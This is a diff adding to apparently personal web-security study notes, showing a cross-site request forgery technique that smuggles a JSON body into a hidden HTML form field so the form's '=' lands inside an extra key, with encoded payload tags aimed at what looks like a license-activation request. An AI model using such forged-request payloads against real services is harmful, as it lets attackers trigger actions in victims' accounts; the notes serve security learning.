@@ -496,9 +496,17 @@ document.location="http://stock.YOUR-LAB-ID.web-security-academy.net/?productId=
 ```
 {"activatees":{"activatee":[{"activateeEmailId":"","activateeEnterpriseId":"300007714280","isDefault":true,"isEnabled":true,"addIfNotAvailable":true}]},"activationProductKeys":{"activationProductKeyId":[{"activationQuantity":1,"productKey":"f5dbdc8e-2837-4313-a6de-5f9bba954a77"}]},"activationAttributes":{"activationAttribute":[{"name":"MaintenanceExpiration","value":"2025-05-02","readOnly":false,"mandatory":true,"associatedAttribute":null},{"name":"FileName","value":"IntelLicense.lic","readOnly":false,"mandatory":true,"associatedAttribute":null}]}}=
 ```
+- HTML tag that generates:
+```
+<input type="hidden" name="&#123;&quot;activatees&quot;&#58;&#123;&quot;activatee&quot;&#58;&#91;&#123;&quot;activateeEmailId&quot;&#58;&quot;&quot;&#44;&quot;activateeEnterpriseId&quot;&#58;&quot;300007714280&quot;&#44;&quot;isDefault&quot;&#58;true&#44;&quot;isEnabled&quot;&#58;true&#44;&quot;addIfNotAvailable&quot;&#58;true&#125;&#93;&#125;&#44;&quot;activationProductKeys&quot;&#58;&#123;&quot;activationProductKeyId&quot;&#58;&#91;&#123;&quot;activationQuantity&quot;&#58;1&#44;&quot;productKey&quot;&#58;&quot;f5dbdc8e&#45;2837&#45;4313&#45;a6de&#45;5f9bba954a77&quot;&#125;&#93;&#125;&#44;&quot;activationAttributes&quot;&#58;&#123;&quot;activationAttribute&quot;&#58;&#91;&#123;&quot;name&quot;&#58;&quot;MaintenanceExpiration&quot;&#44;&quot;value&quot;&#58;&quot;2025&#45;05&#45;02&quot;&#44;&quot;readOnly&quot;&#58;false&#44;&quot;mandatory&quot;&#58;true&#44;&quot;associatedAttribute&quot;&#58;null&#125;&#44;&#123;&quot;name&quot;&#58;&quot;FileName&quot;&#44;&quot;value&quot;&#58;&quot;IntelLicense&#46;lic&quot;&#44;&quot;readOnly&quot;&#58;false&#44;&quot;mandatory&quot;&#58;true&#44;&quot;associatedAttribute&quot;&#58;null&#125;&#93;&#125;&#125;" value="" />
+```
 - Solution: craft the form payload so that an additional JSON pair is added that looks like `"newKey=":"newValue"`
 	- The URL param '=' becomes part of the JSON key name
 	- JSON typically doesn't care about extraneous values added
+- New HTML tag:
+```
+<input type="hidden" name="{&quot;activatees&quot;:{&quot;activatee&quot;:[{&quot;activateeEmailId&quot;:&quot;&quot;,&quot;activateeEnterpriseId&quot;:&quot;300007714280&quot;,&quot;isDefault&quot;:true,&quot;isEnabled&quot;:true,&quot;addIfNotAvailable&quot;:true}]},&quot;activationProductKeys&quot;:{&quot;activationProductKeyId&quot;:[{&quot;activationQuantity&quot;:1,&quot;productKey&quot;:&quot;f5dbdc8e-2837-4313-a6de-5f9bba954a77&quot;}]},&quot;activationAttributes&quot;:{&quot;activationAttribute&quot;:[{&quot;name&quot;:&quot;MaintenanceExpiration&quot;,&quot;value&quot;:&quot;2025-05-02&quot;,&quot;readOnly&quot;:false,&quot;mandatory&quot;:true,&quot;associatedAttribute&quot;:null},{&quot;name&quot;:&quot;FileName&quot;,&quot;value&quot;:&quot;IntelLicense.lic&quot;,&quot;readOnly&quot;:false,&quot;mandatory&quot;:true,&quot;associatedAttribute&quot;:null,&quot;activatees" value="&quot;:&quot;x2467&quot;}]}}" />
+```
 
 
 # OAUTH
